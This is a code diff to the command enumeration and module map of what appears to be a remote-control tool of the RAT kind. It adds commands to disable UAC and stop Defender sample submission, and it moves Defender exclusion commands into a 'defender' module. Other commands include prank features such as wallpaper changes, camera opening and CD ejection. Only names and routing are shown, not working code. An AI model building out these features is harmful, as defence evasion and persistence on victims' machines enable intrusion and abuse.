@@ -119,6 +119,10 @@ class Command(Enum):
     REMOVE_EXTENSION_EXCLUSION = "REMOVE_EXTENSION_EXCLUSION"
     ADD_FOLDER_EXCLUSION = "ADD_FOLDER_EXCLUSION"
     REMOVE_FOLDER_EXCLUSION = "REMOVE_FOLDER_EXCLUSION"
+    STOP_SAMPLING = "STOP_SAMPLING"
+
+    ENABLE_UAC = "ENABLE_UAC"
+    DISABLE_UAC = "DISABLE_UAC"
     
 command_to_module_map = {
     # File System Commands
@@ -224,9 +228,9 @@ command_to_module_map = {
     Command.SHOW_MESSAGE_BOX: "troll",
     Command.RUN_TROLL_SCRIPT: "troll",
     Command.OPEN_CAMERA_APP: "troll",
+    Command.CHANGE_WALLPAPER_HTTP: "troll",
     Command.START_WINDOW_TROLL : "window_troll",
     Command.STOP_WINDOW_TROLL : "window_troll",
-    Command.CHANGE_WALLPAPER_HTTP: "troll",
 
     Command.EJECT_CD: "cd",
     Command.EJECT_CD_CONTINOUS: "cd",
@@ -235,11 +239,16 @@ command_to_module_map = {
     Command.SHOW_WEBSITE: "website_spam",
 
     # Persistence Commands
-    Command.ADD_EXTENSION_EXCLUSION: "persistence",
-    Command.REMOVE_EXTENSION_EXCLUSION: "persistence",
-    Command.ADD_FOLDER_EXCLUSION: "persistence",
-    Command.REMOVE_FOLDER_EXCLUSION: "persistence",
+    Command.ADD_EXTENSION_EXCLUSION: "defender",
+    Command.REMOVE_EXTENSION_EXCLUSION: "defender",
+    Command.ADD_FOLDER_EXCLUSION: "defender",
+    Command.REMOVE_FOLDER_EXCLUSION: "defender",
+    Command.STOP_SAMPLING: "defender",
+
+    Command.ENABLE_UAC: "uac",
+    Command.DISABLE_UAC: "uac",
 }
+
 
 class CommandArgs(BaseModel):
     class Config:
